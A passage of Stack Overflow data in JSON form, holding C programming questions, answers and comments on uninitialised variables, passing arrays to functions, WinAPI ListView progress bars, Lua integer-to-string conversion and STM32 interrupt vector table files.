"https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1459526766, "post_id": 36312766, "comment_id": 60341253, "body": "the posted code contains lots of &#39;magic numbers.  &#39;magic&#39; numbers make the code much more difficult to understand, debug, maintain.  Suggest using #define statements or enum statements to give those &#39;magic&#39; numbers meaningful names, then use those meaningful names throughout the code."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1459526881, "post_id": 36312766, "comment_id": 60341321, "body": "the posted code has a logic problem. 1) most of the variables are not being set/initialized on any one pass through the code.  2) when an invalid value is entered, the code goes ahead and sums the numbers and prints the resulting value."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1459527011, "post_id": 36312766, "comment_id": 60341386, "body": "unless your running with no OS, all the signatures for the <code>main()</code> function have a <code>int</code> return type"}], "answers": [{"tags": [], "owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "is_accepted": true, "score": 3, "last_activity_date": 1459351299, "last_edit_date": 1459351299, "creation_date": 1459350790, "answer_id": 36312934, "question_id": 36312766, "link": "https://stackoverflow.com/questions/36312766/whats-wrong-with-my-output-answer/36312934#36312934", "title": "Whats wrong with my output answer?", "body": "<p>The problem is that you do not initialize all those variables, which means their value will be <em>indeterminate</em> and you will have <em>undefined behavior</em>.</p>\n\n<p>If you initialize all those variables to zero it should work.</p>\n\n<p>The reason you get the wrong value is because of the above, <em>and</em> you only set one variable in the program, adding it to all the uninitialized variables. So in practice what's happening is that you add a lot of seemingly random values to a single calculated value and print that as output.</p>\n"}, {"tags": [], "owner": {"reputation": 77, "user_id": 5521543, "user_type": "registered", "profile_image": "https://graph.facebook.com/10204658594895407/picture?type=large", "display_name": "Hajras El Gdiry HG", "link": "https://stackoverflow.com/users/5521543/hajras-el-gdiry-hg"}, "is_accepted": false, "score": 0, "last_activity_date": 1459351780, "creation_date": 1459351780, "answer_id": 36313318, "question_id": 36312766, "link": "https://stackoverflow.com/questions/36312766/whats-wrong-with-my-output-answer/36313318#36313318", "title": "Whats wrong with my output answer?", "body": "<p>you have t initialize your values it is a grat habit in coding espicialy when you use it in summing . for example :</p>\n\n<p>int = x ,y ; // you did not initialaize so x and y have a random number \nint sum = x+y; //will give you a wrong answer since the compiler doesnt give them zero without you tell him to do that . </p>\n\n<hr>\n\n<p>int = x =5 ,y = 0;\nint sum = x+y; //leads to 5 .</p>\n"}, {"tags": [], "owner": {"reputation": 137, "user_id": 4983155, "user_type": "registered", "accept_rate": 56, "profile_image": "https://lh6.googleusercontent.com/-Jn4zByOMdjc/AAAAAAAAAAI/AAAAAAAAB2Q/ra2ySY0yfHU/photo.jpg?sz=128", "display_name": "Ahmed F. Mostafa", "link": "https://stackoverflow.com/users/4983155/ahmed-f-mostafa"}, "is_accepted": false, "score": 0, "last_activity_date": 1459429142, "creation_date": 1459429142, "answer_id": 36334223, "question_id": 36312766, "link": "https://stackoverflow.com/questions/36312766/whats-wrong-with-my-output-answer/36334223#36334223", "title": "Whats wrong with my output answer?", "body": "<p>non-initialized variables will return whatever in the allocated memory location, it will be a garbage.\nyou have to initialize all the used variables .\nplease consider below code.</p>\n\n<pre><code>int a,b;\na=5;\nprintf(\"\\na= %d b= %d\",a,b);\n</code></pre>\n\n<p>it is guaranteed that a will return 5 but nobody knows what b will return.\nas you cant know what is stored on the memory reserved for variable b.</p>\n"}], "owner": {"reputation": 3, "user_id": 6135335, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CSAX8.jpg?s=128&g=1", "display_name": "Adel", "link": "https://stackoverflow.com/users/6135335/adel"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 40, "favorite_count": 0, "accepted_answer_id": 36312934, "answer_count": 3, "score": 0, "last_activity_date": 1459429142, "creation_date": 1459350313, "last_edit_date": 1459351359, "question_id": 36312766, "link": "https://stackoverflow.com/questions/36312766/whats-wrong-with-my-output-answer", "title": "Whats wrong with my output answer?", "body": "<p>Hi guys this is my first question so I\u2019m hoping to get some help.\nBasically the Output is Wrong though the calculation is right!!\nWhenever I add more than 7 variables to 'total' the output get corrupted\n7 and less variables the output give a right answer??!!\nThis is my coding I need Your HELP Guyz</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nvoid main()\n{\n    float total = 0, necklace, scarf, cotton, Lace, Hijab, h, m, l, z;\n    int ch, q;\n    printf(\"\\nFashion : \\n1.Fashion Necklace &lt;Price=RM29&gt;\\n2.Scarf &lt;Price=RM25&gt;\\n3.Cotton T-shirts &lt;Price=RM35&gt;\\n4.Lace Blazer &lt;price=RM33&gt;\\n5.Set of 2 Hijab &lt;price=RM35&gt;\\n6.Fleece-Lined Hoodie &lt;price=RM49&gt;\");\n    printf(\"\\nEnter Your Choice : \");\n    scanf(\"%d\", &amp;ch);\n    if (ch &lt; 10)\n    {\n        printf(\"\\nEnter Quantity : \");\n        scanf(\"%d\", &amp;q);\n        if (ch == 1)\n        {\n            necklace = 29 * q;\n        }\n        else if(ch == 2)\n        {\n            scarf = q * 25;\n        }\n        else if(ch == 3)\n        {\n            cotton = 35 * q;\n        }\n        else if(ch == 4)\n        {\n            Lace = 33 * q;\n        }\n        else if(ch == 5)\n        {\n            Hijab = 35 * q;\n        }\n        else if(ch == 6)\n        {\n            h = 49 * q;\n        }\n        else if(ch == 7)\n        {\n            m = 20 * q;\n        }\n        else if(ch == 8)\n        {\n            l = 40 * q;\n        }\n        else if(ch == 9)\n        {\n            z = 15 * q;\n        }\n    }\n    else\n    {\n        printf(\"\\nInvalid Choice!!!\");\n    }\n    total = (scarf + necklace + cotton + Lace + Hijab + h + m + l + z);\n    printf(\"\\nTotal = RM%.2f\", total);\n}\n</code></pre>\n"}, {"tags": ["c", "arrays", "function"], "comments": [{"owner": {"reputation": 1664, "user_id": 2649079, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b41a2c9d80a4b8917940e65858c9abc0?s=128&d=identicon&r=PG", "display_name": "Nadir", "link": "https://stackoverflow.com/users/2649079/nadir"}, "edited": false, "score": 0, "creation_date": 1459350192, "post_id": 36312620, "comment_id": 60248626, "body": "Can you change <code>is_authorized(x,int *authPorts[N]);</code> to <code>is_authorized(x, &amp;authPorts);</code>"}, {"owner": {"reputation": 1664, "user_id": 2649079, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b41a2c9d80a4b8917940e65858c9abc0?s=128&d=identicon&r=PG", "display_name": "Nadir", "link": "https://stackoverflow.com/users/2649079/nadir"}, "reply_to_user": {"reputation": 35069, "user_id": 1324, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/883238a436c061eaf848af87b8fda561?s=128&d=identicon&r=PG", "display_name": "Paul Roub", "link": "https://stackoverflow.com/users/1324/paul-roub"}, "edited": false, "score": 0, "creation_date": 1459350347, "post_id": 36312620, "comment_id": 60248758, "body": "@PaulRoub Right, edited comment, i mean <code>&amp;authPorts</code>"}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 1, "creation_date": 1459350384, "post_id": 36312620, "comment_id": 60248791, "body": "When the compiler says: fishy line <code>is_authorized(x,int *authPorts[N]);</code>, it might be a good idea to read that line twice. Looks like caused by copy/paste. Voting to close this as simple typo."}], "answers": [{"tags": [], "owner": {"reputation": 244, "user_id": 6134918, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4dd3c3e4c2313fe66cc45a8b1e5c8e96?s=128&d=identicon&r=PG&f=1", "display_name": "Hugo", "link": "https://stackoverflow.com/users/6134918/hugo"}, "is_accepted": true, "score": 2, "last_activity_date": 1459350456, "last_edit_date": 1459350456, "creation_date": 1459350114, "answer_id": 36312700, "question_id": 36312620, "link": "https://stackoverflow.com/questions/36312620/function-to-check-if-a-value-is-in-an-array/36312700#36312700", "title": "Function to check if a value is in an array", "body": "<p>You are trying to define an array, inside an argument.</p>\n\n<p>You can learn more on how to pass array to function <a href=\"http://beginnersbook.com/2014/01/c-passing-array-to-function-example/\" rel=\"nofollow\">here</a></p>\n\n<p>To answer your question, change to</p>\n\n<p><code>is_authorized(x, authPorts);</code></p>\n"}, {"comments": [{"owner": {"reputation": 408, "user_id": 6094551, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-Fz1lEdMMVAw/AAAAAAAAAAI/AAAAAAAAASw/RwgU7Mo_U6Q/photo.jpg?sz=128", "display_name": "Asier S&#225;nchez Rodr&#237;guez", "link": "https://stackoverflow.com/users/6094551/asier-s%c3%a1nchez-rodr%c3%adguez"}, "edited": false, "score": 0, "creation_date": 1459350456, "post_id": 36312772, "comment_id": 60248845, "body": "You don&#39;t need to specify a pointer to an array, just pass a pointer to int. apart from that, as @Hugo said you are declaring a new array inside the function call"}], "tags": [], "owner": {"reputation": 408, "user_id": 6094551, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-Fz1lEdMMVAw/AAAAAAAAAAI/AAAAAAAAASw/RwgU7Mo_U6Q/photo.jpg?sz=128", "display_name": "Asier S&#225;nchez Rodr&#237;guez", "link": "https://stackoverflow.com/users/6094551/asier-s%c3%a1nchez-rodr%c3%adguez"}, "is_accepted": false, "score": -1, "last_activity_date": 1459350327, "creation_date": 1459350327, "answer_id": 36312772, "question_id": 36312620, "link": "https://stackoverflow.com/questions/36312620/function-to-check-if-a-value-is-in-an-array/36312772#36312772", "title": "Function to check if a value is in an array", "body": "<p>fixed code</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#define N 8\n\nint is_authorized(int port,int *auth_ports);\n\n\n\nint main(void) {\n\n  int x = 73;\n\n  /* authorised ports: */\n  int authPorts[N] = {20,73,60,80,212,434,2211,434};\n\n\n   is_authorized(x, authPorts);\n\n  return 0;\n}\n\nint is_authorized(int port, int *auth_ports){\n  int i;\n  for (i = 0; i &lt; N; i++){                    \n      if (port == auth_ports[i])\n         printf(\"1\");\n      else\n          printf(\"0\");}\n  return 0;\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 77, "user_id": 5521543, "user_type": "registered", "profile_image": "https://graph.facebook.com/10204658594895407/picture?type=large", "display_name": "Hajras El Gdiry HG", "link": "https://stackoverflow.com/users/5521543/hajras-el-gdiry-hg"}, "is_accepted": false, "score": 0, "last_activity_date": 1459352254, "creation_date": 1459352254, "answer_id": 36313540, "question_id": 36312620, "link": "https://stackoverflow.com/questions/36312620/function-to-check-if-a-value-is-in-an-array/36313540#36313540", "title": "Function to check if a value is in an array", "body": "<p>you do not need the asterix(*) for your array , whenever you want to pass an array to a function the compiler copy the address of the array and send it to the function without needing to tell him that it's called passing by refrence . </p>\n"}], "owner": {"reputation": 13, "user_id": 6135191, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/90bb17d9f1e1bd3ebd073fa72e6076ad?s=128&d=identicon&r=PG&f=1", "display_name": "quixotically", "link": "https://stackoverflow.com/users/6135191/quixotically"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 126, "favorite_count": 0, "closed_date": 1459468591, "accepted_answer_id": 36312700, "answer_count": 3, "score": -1, "last_activity_date": 1459352254, "creation_date": 1459349919, "last_edit_date": 1459350261, "question_id": 36312620, "link": "https://stackoverflow.com/questions/36312620/function-to-check-if-a-value-is-in-an-array", "closed_reason": "Duplicate", "title": "Function to check if a value is in an array", "body": "<p>I can get the code working without using a function, but as it is I get this error message:  </p>\n\n<blockquote>\n  <p>error: expected expression before 'int'<br>\n  is_authorized(x,int *authPorts[N]);</p>\n</blockquote>\n\n<p>By researching this I think it might be something to do with passing an array to a function but everywhere I found something that seemed like it might be relevant had too much information that I didn't understand for me to use it.</p>\n\n<p>Here's my code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#define N 8\n\nint is_authorized(int port,int *auth_ports[]);\n\nint main(void) {  \n  int x = 73;\n\n  /* authorised ports: */\n  int authPorts[N] = {20,73,60,80,212,434,2211,434};\n\n  is_authorized(x,int *authPorts[N]);\n\n  return 0;\n}\n\nint is_authorized(int port, int *auth_ports[]){\n  int i;\n  for (i = 0; i &lt; N; i++){                    \n      if (port == *auth_ports[i])\n         printf(\"1\");\n      else\n          printf(\"0\");}\n}\n</code></pre>\n"}, {"tags": ["c", "listview", "winapi", "progress-bar"], "comments": [{"owner": {"reputation": 1560, "user_id": 2030219, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/6314bf166040bf1eb9deb3a6c03d6864?s=128&d=identicon&r=PG", "display_name": "Joel", "link": "https://stackoverflow.com/users/2030219/joel"}, "edited": false, "score": 0, "creation_date": 1459359027, "post_id": 36312619, "comment_id": 60254814, "body": "I guess as workaround: 1.- Use a custom control with ListView and maybe an ownerdraw progressbar. 2.- Dump WinAPI and use a C framework like gtk which can be more easy achive what you want. 3.- Move from C and use another language framework like Qt or WxWidgets which they have already a custom control like those."}, {"owner": {"reputation": 570607, "user_id": 505088, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/3c0aac2191718ef0309dbc034d9b9961?s=128&d=identicon&r=PG", "display_name": "David Heffernan", "link": "https://stackoverflow.com/users/505088/david-heffernan"}, "reply_to_user": {"reputation": 1560, "user_id": 2030219, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/6314bf166040bf1eb9deb3a6c03d6864?s=128&d=identicon&r=PG", "display_name": "Joel", "link": "https://stackoverflow.com/users/2030219/joel"}, "edited": false, "score": 0, "creation_date": 1459360605, "post_id": 36312619, "comment_id": 60255733, "body": "@Joel This is not hard in winapi"}, {"owner": {"reputation": 449279, "user_id": 65863, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f00013ceab8fb1928885c5c172fbfd4a?s=128&d=identicon&r=PG", "display_name": "Remy Lebeau", "link": "https://stackoverflow.com/users/65863/remy-lebeau"}, "edited": false, "score": 0, "creation_date": 1459362206, "post_id": 36312619, "comment_id": 60256803, "body": "This is pretty easy to do with an owner-drawn ListView and some custom drawing logic to draw an image and a colored rectangle underneath it."}, {"owner": {"reputation": 10424, "user_id": 3408572, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/0f3a08b145553b98749d3d0572d01265?s=128&d=identicon&r=PG&f=1", "display_name": "andlabs", "link": "https://stackoverflow.com/users/3408572/andlabs"}, "reply_to_user": {"reputation": 1560, "user_id": 2030219, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/6314bf166040bf1eb9deb3a6c03d6864?s=128&d=identicon&r=PG", "display_name": "Joel", "link": "https://stackoverflow.com/users/2030219/joel"}, "edited": false, "score": 0, "creation_date": 1459363043, "post_id": 36312619, "comment_id": 60257439, "body": "@Joel For what it&#39;s wroth it&#39;ll be roughly the same amount of work in GTK+ due to having to play around with cell layouts and cell renderers and GtkIconView being somewhat fickle (maybe slightly easier in more recent versions with GtkFlowBox but YMMV). In my opinion, if you have this much code already, just stay with the Windows API."}], "owner": {"reputation": 1254, "user_id": 4566312, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/f792d4cf0473ff830ff5a857ec41bf83?s=128&d=identicon&r=PG&f=1", "display_name": "Tom", "link": "https://stackoverflow.com/users/4566312/tom"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 95, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1459349919, "creation_date": 1459349919, "question_id": 36312619, "link": "https://stackoverflow.com/questions/36312619/add-a-progressbar-to-listview-items-in-largeicon-mode", "title": "Add a ProgressBar to ListView items in LargeIcon mode", "body": "<p>Is there a way to add a ProgressBar to ListView items in LargeIcon mode, for example:</p>\n\n<p><a href=\"https://i.stack.imgur.com/WCyw3.jpg\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/WCyw3.jpg\" alt=\"enter image description here\"></a></p>\n\n<p>The ProgressBar can be the default Windows ProgressBar control, or it can be of a single color as shown in the image.</p>\n"}, {"tags": ["c", "lua", "floating-point"], "answers": [{"comments": [{"owner": {"reputation": 7126, "user_id": 1560774, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/e5c7d8e9733ac6dee89d29d0cd0123f4?s=128&d=identicon&r=PG", "display_name": "Virus721", "link": "https://stackoverflow.com/users/1560774/virus721"}, "edited": false, "score": 0, "creation_date": 1459352326, "post_id": 36313351, "comment_id": 60250374, "body": "Thanks for your help but lua_tostring is supposed to do a int -&gt; string conversion."}], "tags": [], "owner": {"reputation": 408, "user_id": 6094551, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-Fz1lEdMMVAw/AAAAAAAAAAI/AAAAAAAAASw/RwgU7Mo_U6Q/photo.jpg?sz=128", "display_name": "Asier S&#225;nchez Rodr&#237;guez", "link": "https://stackoverflow.com/users/6094551/asier-s%c3%a1nchez-rodr%c3%adguez"}, "is_accepted": false, "score": 0, "last_activity_date": 1459351842, "creation_date": 1459351842, "answer_id": 36313351, "question_id": 36312610, "link": "https://stackoverflow.com/questions/36312610/lua-lua-tostring-returning-strange-results/36313351#36313351", "title": "Lua - lua_tostring() returning strange results", "body": "<p>I answer since I cannot comment, but what I see in your code.</p>\n\n<pre><code>lua_pushinteger( m_pLuaState, 123 );\nconst char * sAsString = lua_tostring( m_pLuaState, -1 );\n</code></pre>\n\n<p>you are pushing and integer and pulling a string, since they are different data types, I see normal that it give you funny outputs. I suppose that is trying to translate the information of the stack from integer to string.</p>\n"}, {"tags": [], "owner": {"reputation": 7126, "user_id": 1560774, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/e5c7d8e9733ac6dee89d29d0cd0123f4?s=128&d=identicon&r=PG", "display_name": "Virus721", "link": "https://stackoverflow.com/users/1560774/virus721"}, "is_accepted": false, "score": 2, "last_activity_date": 1459352296, "creation_date": 1459352296, "answer_id": 36313560, "question_id": 36312610, "link": "https://stackoverflow.com/questions/36312610/lua-lua-tostring-returning-strange-results/36313560#36313560", "title": "Lua - lua_tostring() returning strange results", "body": "<p>Well after recompiling the lua53.lib once the types to be used for integer and floats were defined, it works properly.</p>\n\n<p>The problem is that I changed these types without recompiling the library. The Windows desktop version was initally compiling using doubles instead of floats. I guess this is the origin of the problem.</p>\n"}], "owner": {"reputation": 7126, "user_id": 1560774, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/e5c7d8e9733ac6dee89d29d0cd0123f4?s=128&d=identicon&r=PG", "display_name": "Virus721", "link": "https://stackoverflow.com/users/1560774/virus721"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 274, "favorite_count": 0, "answer_count": 2, "score": 2, "last_activity_date": 1459352296, "creation_date": 1459349905, "question_id": 36312610, "link": "https://stackoverflow.com/questions/36312610/lua-lua-tostring-returning-strange-results", "title": "Lua - lua_tostring() returning strange results", "body": "<p>Let the following code :</p>\n\n<pre><code>lua_pushinteger( m_pLuaState, 123 );\nconst char * sAsString = lua_tostring( m_pLuaState, -1 );\n</code></pre>\n\n<p>The returns non-NULL pointers to strings containing strange numeric values like <code>\"17137503626592379\"</code> or <code>\"14326121113845883\"</code> etc...</p>\n\n<p>It seems <strong>random</strong>, does not violate memory (at least in a few tries), and the returned strings always contain valid numeric values despite not being the one I'm passing in the first place (i.e 123).</p>\n\n<p>I assume this has to do with floating point / integer convertions.</p>\n\n<p>I'm using <code>Lua 5.3.2</code>, which supports both \"integer\" and \"float\" as being two subtypes of \"number\", and i'm using floats for numbers and int for integers.\nI'm using both Windows CE and Windows 7. On both platforms \"int\" and \"float\" are both 32 bits, despite my Windows 7 being 64 bits, because I'm explicitely compiling for x86.</p>\n\n<p>Here is a piece of my luaconf.h</p>\n\n<pre><code>#if !defined(LUA_INT_TYPE)\n#define LUA_INT_TYPE    LUA_INT_INT\n#endif\n\n#if !defined(LUA_FLOAT_TYPE)\n#define LUA_FLOAT_TYPE  LUA_FLOAT_FLOAT\n#endif\n</code></pre>\n\n<p>While writing this I realized that it might be due to the fact that I changed the types being used without recompiling the static lua .lib that i'm linking against. Could this be due to this ? I will try recompiling...</p>\n\n<p>Could this be due to something else ? Thank you.</p>\n"}, {"tags": ["c", "assembly", "vector", "arm", "stm32"], "comments": [{"owner": {"reputation": 199, "user_id": 6120259, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-83GPeUctbwo/AAAAAAAAAAI/AAAAAAAAAC0/xVH3zy5KJ7U/photo.jpg?sz=128", "display_name": "Ettore Barattelli", "link": "https://stackoverflow.com/users/6120259/ettore-barattelli"}, "edited": false, "score": 1, "creation_date": 1459349120, "post_id": 36312130, "comment_id": 60247845, "body": "I believe it is the interrupt vector table"}, {"owner": {"reputation": 199, "user_id": 6120259, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-83GPeUctbwo/AAAAAAAAAAI/AAAAAAAAAC0/xVH3zy5KJ7U/photo.jpg?sz=128", "display_name": "Ettore Barattelli", "link": "https://stackoverflow.com/users/6120259/ettore-barattelli"}, "edited": false, "score": 0, "creation_date": 1459350890, "post_id": 36312130, "comment_id": 60249146, "body": "That is not specific to CrossWorks, all STM32-based projects (and basically all projects for microcontrollers supporting interrupts) have a table (either in C or assembly) that associate an interrupt event with a function (this is called an interrupt vector table or IVT). Every time the interrupt line is triggered with an event (and that interrupt is not masked), the corresponding function is called. Example, when the DMA1_Channel1 interrupt is triggered, the DMA1_Channel1_IRQHandler function is called"}], "answers": [{"tags": [], "owner": {"reputation": 1, "user_id": 6134833, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-mon4PirMn8o/AAAAAAAAAAI/AAAAAAAAABY/KXeinIWIDfs/photo.jpg?sz=128", "display_name": "Ahmed Nabil Gaber", "link": "https://stackoverflow.com/users/6134833/ahmed-nabil-gaber"}, "is_accepted": false, "score": 0, "last_activity_date": 1459349734, "creation_date": 1459349734, "answer_id": 36312538, "question_id": 36312130, "link": "https://stackoverflow.com/questions/36312130/what-is-vec-file-in-a-s-c-and-h-context-specifically-stm32f10x-md-vec/36312538#36312538", "title": "What is .vec file in a .s, .c, and .h context? Specifically, stm32f10x_md.vec", "body": "<p>I think the .vec is a section you may find it in the linker script. Like MPC56XX there is a section called .vect especially for interrupt vector table.</p>\n\n<p>This is my first time to hear about .vec file. </p>\n\n<p>This is a great chance to follow this question to learn more.</p>\n"}, {"tags": [], "owner": {"reputation": 199, "user_id": 6120259, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-83GPeUctbwo/AAAAAAAAAAI/AAAAAAAAAC0/xVH3zy5KJ7U/photo.jpg?sz=128", "display_name": "Ettore Barattelli", "link": "https://stackoverflow.com/users/6120259/ettore-barattelli"}, "is_accepted": true, "score": 1, "last_activity_date": 1459350415, "creation_date": 1459350415, "answer_id": 36312803, "question_id": 36312130, "link": "https://stackoverflow.com/questions/36312130/what-is-vec-file-in-a-s-c-and-h-context-specifically-stm32f10x-md-vec/36312803#36312803", "title": "What is .vec file in a .s, .c, and .h context? Specifically, stm32f10x_md.vec", "body": "<p>I think it is a file that contains a portion of an interrupt vector table. Consider a startup assembly file that looks like:</p>\n\n<pre><code>_vectors:\n  .word __stack_end__\n  ...\n  ISR_HANDLER SysTick_Handler \n  #if defined(__TARGET_LD)\n    #include \"STM32F10X_LD.vec\"\n  #elif defined(__TARGET_MD)\n    #include \"STM32F10X_MD.vec\"\n  ...\n  #endif\n</code></pre>\n\n<p>Using separate .vec files you can use the same top level Startup.s file independently on the target microcontroller you're using and just customize/include your target specific .vec file</p>\n"}, {"tags": [], "owner": {"reputation": 62072, "user_id": 16007, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/e859640aaeb4b305e163a990be827cf9?s=128&d=identicon&r=PG&f=1", "display_name": "old_timer", "link": "https://stackoverflow.com/users/16007/old-timer"}, "is_accepted": false, "score": 0, "last_activity_date": 1459351109, "creation_date": 1459351109, "answer_id": 36313061, "question_id": 36312130, "link": "https://stackoverflow.com/questions/36312130/what-is-vec-file-in-a-s-c-and-h-context-specifically-stm32f10x-md-vec/36313061#36313061", "title": "What is .vec file in a .s, .c, and .h context? Specifically, stm32f10x_md.vec", "body": "<p>the cortex-m's are nice in that you dont HAVE to wrap exceptions with special entry or return stuff.  So other than reset dealing with .data and .bss you can get away with no assembly for bootstrap, but you still have to generate the vector table somehow and populate it with addresses to functions.  So this looks like one way to do it.  I suspect it is specific to that toolchain.  The easy way of course is to just use the assembler and assembler directives since you have the assembler there already to support the compiler.  </p>\n"}, {"tags": [], "owner": {"reputation": 35113, "user_id": 3826372, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/P0peM.png?s=128&g=1", "display_name": "Ross Ridge", "link": "https://stackoverflow.com/users/3826372/ross-ridge"}, "is_accepted": false, "score": 1, "last_activity_date": 1459360357, "creation_date": 1459360357, "answer_id": 36316156, "question_id": 36312130, "link": "https://stackoverflow.com/questions/36312130/what-is-vec-file-in-a-s-c-and-h-context-specifically-stm32f10x-md-vec/36316156#36316156", "title": "What is .vec file in a .s, .c, and .h context? Specifically, stm32f10x_md.vec", "body": "<p>It's an ordinary assembly file that's meant to be included in another assembly file.  The name <code>ISR_HANDLER</code> is an assembly macro defined in some other file, maybe <code>startup_stm32f10x_md.s</code>, and would look something like this (taken from <a href=\"https://github.com/limhyon/esc32/blob/master/src/STM32_Startup.s\" rel=\"nofollow\">Rowley Associates's <code>STM32_Startup.s</code></a>):</p>\n\n<pre><code>.macro ISR_HANDLER name= \n   .section .vectors, \"ax\" \n   .word \\name \n   .section .init, \"ax\" \n   .thumb_func \n   .weak \\name \n \\name: \n 1: b 1b /* endless loop */ \n .endm \n</code></pre>\n\n<p>This macro puts an entry in the interrupt vector table for the named interrupt routine, and it also provides a default implementation of the routine, an infinite loop, in case the application doesn't provide one of its own.</p>\n"}], "owner": {"reputation": 15, "user_id": 2297102, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/q4Izm.jpg?s=128&g=1", "display_name": "chmielo13", "link": "https://stackoverflow.com/users/2297102/chmielo13"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 220, "favorite_count": 1, "accepted_answer_id": 36312803, "answer_count": 4, "score": 0, "last_activity_date": 1459360357, "creation_date": 1459348685, "last_edit_date": 1459359227, "question_id": 36312130, "link": "https://stackoverflow.com/questions/36312130/what-is-vec-file-in-a-s-c-and-h-context-specifically-stm32f10x-md-vec", "title": "What is .vec file in a .s, .c, and .h context? Specifically, stm32f10x_md.vec", "body": "<p>What is a .vec file in a .s, .c, and .h context? Specifically, stm32f10x_md.vec. I keep getting stuck on \"ISR_HANDLER USART3_IRQHandler\" inside the .vec file and all googling leads me to reading about openCV. The .vec file doesn't seem to exist anywhere. The closest thing seems to be startup_stm32f10x_md.s. I'm using Rowley CrossWorks with the Nucleo f103rb. </p>\n\n<p>These are the file's entire contents. Based on the answers so far I wonder if .vec is specific to CrossWorks?</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>ISR_HANDLER WWDG_IRQHandler\nISR_HANDLER PVD_IRQHandler\nISR_HANDLER TAMPER_IRQHandler\nISR_HANDLER RTC_IRQHandler\nISR_HANDLER FLASH_IRQHandler\nISR_HANDLER RCC_IRQHandler\nISR_HANDLER EXTI0_IRQHandler\nISR_HANDLER EXTI1_IRQHandler\nISR_HANDLER EXTI2_IRQHandler\nISR_HANDLER EXTI3_IRQHandler\nISR_HANDLER EXTI4_IRQHandler\nISR_HANDLER DMA1_Channel1_IRQHandler\nISR_HANDLER DMA1_Channel2_IRQHandler\nISR_HANDLER DMA1_Channel3_IRQHandler\nISR_HANDLER DMA1_Channel4_IRQHandler\nISR_HANDLER DMA1_Channel5_IRQHandler\nISR_HANDLER DMA1_Channel6_IRQHandler\nISR_HANDLER DMA1_Channel7_IRQHandler\nISR_HANDLER ADC1_2_IRQHandler\nISR_HANDLER USB_HP_CAN1_TX_IRQHandler\nISR_HANDLER USB_LP_CAN1_RX0_IRQHandler\nISR_HANDLER CAN1_RX1_IRQHandler\nISR_HANDLER CAN1_SCE_IRQHandler\nISR_HANDLER EXTI9_5_IRQHandler\nISR_HANDLER TIM1_BRK_IRQHandler\nISR_HANDLER TIM1_UP_IRQHandler\nISR_HANDLER TIM1_TRG_COM_IRQHandler\nISR_HANDLER TIM1_CC_IRQHandler\nISR_HANDLER TIM2_IRQHandler\nISR_HANDLER TIM3_IRQHandler\nISR_HANDLER TIM4_IRQHandler\nISR_HANDLER I2C1_EV_IRQHandler\nISR_HANDLER I2C1_ER_IRQHandler\nISR_HANDLER I2C2_EV_IRQHandler\nISR_HANDLER I2C2_ER_IRQHandler\nISR_HANDLER SPI1_IRQHandler\nISR_HANDLER SPI2_IRQHandler\nISR_HANDLER USART1_IRQHandler\nISR_HANDLER USART2_IRQHandler\nISR_HANDLER USART3_IRQHandler\nISR_HANDLER EXTI15_10_IRQHandler\nISR_HANDLER 